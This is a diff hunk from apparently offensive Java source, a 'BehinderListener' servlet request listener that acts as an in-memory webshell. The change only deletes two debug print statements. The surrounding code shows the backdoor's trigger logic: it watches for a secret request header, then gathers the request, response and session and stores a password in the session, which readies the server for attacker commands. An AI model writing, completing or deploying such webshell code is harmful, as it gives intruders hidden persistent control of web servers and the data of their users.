@@ -83,11 +83,9 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
             if (request.getHeader(headerName) != null
                     && request.getHeader(headerName).contains(headerValue)) {
                 HttpServletResponse response = this.getResponseFromRequest(request);
-                System.out.println(response);
                 HttpSession session = ((HttpServletRequest) request).getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                System.out.println(getInternalResponse(response));
                 obj.put("response", getInternalResponse(response));
                 obj.put("session", session);
                 session.setAttribute("u", this.pass);
